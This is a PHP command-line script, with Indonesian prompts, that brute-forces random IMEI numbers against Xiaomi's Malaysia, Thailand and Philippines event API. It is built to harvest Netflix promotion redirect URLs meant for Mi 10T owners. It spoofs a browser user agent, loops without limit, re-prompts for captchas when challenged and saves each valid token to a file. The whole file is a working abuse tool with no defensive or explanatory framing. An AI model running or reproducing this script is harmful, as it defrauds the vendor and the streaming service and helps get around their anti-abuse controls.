<?php

$__uid = 'ab2d-e'.mt_rand(10, 99).'1-i'.mt_rand(10, 99).'k-a' . mt_rand(100, 999);
$__imei = '86622805';
$__length = 7;

function http_request($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}

function randNumber($length) {
	$result = '';
	for($i = 0; $i < $length; $i++) {
		$result .= mt_rand(0, 9);
	}
	return $result;
}

$__stopped=false;$ii=0;

echo 'Mi 10T x Netflix'. PHP_EOL;
echo 'Support: MY TH PH'. PHP_EOL;
echo '-----------------'. PHP_EOL;
sleep(1);
echo 'Input UID (optional): ';
$input = fopen("php://stdin","r");
$answer = trim(fgets($input));
if($answer!=='') {
	$__uid=$answer;
}
sleep(1);
echo 'Input awalan IMEI ('.$__imei.'): ';
$input = fopen("php://stdin","r");
$answer = trim(fgets($input));
if($answer!=='') {
	$__imei=$answer;
}
sleep(1);
echo 'Input panjang random IMEI ('.$__length.'): ';
$input = fopen("php://stdin","r");
$answer = trim(fgets($input));
if($answer!=='') {
	$__length=(int)$answer;
}
echo '[x] UID anda: ' . $__uid . PHP_EOL;
echo '[x] Awalan IMEI: ' . $__imei . PHP_EOL;
echo '[x] Panjang random IMEI: ' . $__length . PHP_EOL;
sleep(1);
echo 'Input captcha akan muncul 3x.' . PHP_EOL;
echo 'Buka link dibawah ini, lalu input captchanya.' . PHP_EOL;

$__setting = [
	['my', '', 'Malaysia', 'https://hd.c.mi.com/my/eventapi/api/aptcha/index?type=netflix&uid='.$__uid],
	['th', '', 'Thailand', 'https://hd.c.mi.com/th/eventapi/api/aptcha/index?type=netflix&uid='.$__uid],
	['ph', '', 'Philippines', 'https://hd.c.mi.com/ph/eventapi/api/aptcha/index?type=netflix&uid='.$__uid]
];

foreach ($__setting as $sett) {
	echo '[' . $sett[2] . '] Challenge the captcha' . PHP_EOL;
	echo '=> ' . $sett[3] . PHP_EOL;
	echo 'Input captcha : ';
	$input = fopen("php://stdin","r");
	$answer = trim(fgets($input));
	$__setting[$ii][1] = $answer;
	$ii++;
}
sleep(1);
echo '[READY]' . PHP_EOL;
sleep(1);
while(1) {
	$imei = $__imei . randNumber($__length);
	if($__stopped) {
		break;
	}
	$ii=0;
	foreach ($__setting as $sett) {
		$data = http_request('https://hd.c.mi.com/'.$sett[0].'/eventapi/api/netflix/gettoken?uid='.$__uid.'&vcode='.$sett[1].'&imei='.$imei);
		$data = json_decode($data, true);
		if (isset($data['msg']) && $data['msg'] == 'Success') {
			$__if_valid = $data['data']['redirect_url'] . '|' . $imei . '|' . $sett[2] . PHP_EOL;
			file_put_contents("valid.txt", $__if_valid, FILE_APPEND);
			echo 'VALID => ' . $__if_valid;
		} else if(isset($data['code']) && $data['code'] == '800706') {
			echo '[' . $sett[2] . '] Challenge the captcha again' . PHP_EOL;
			echo '=> ' . $sett[3] . PHP_EOL;
			echo 'Input captcha : ';
			$input = fopen("php://stdin","r");
			$answer = trim(fgets($input));
			$__setting[$ii][1] = $answer;
			echo 'New captcha saved.' . PHP_EOL;
		} else if(isset($data['code']) && $data['code'] == '800707') {
			echo 'INVALID => ' . $imei . '|' . $sett[2] . PHP_EOL;
		} else {
			echo 'An unexpected error has occured.' . PHP_EOL;
		}
		$ii++;
	}
}
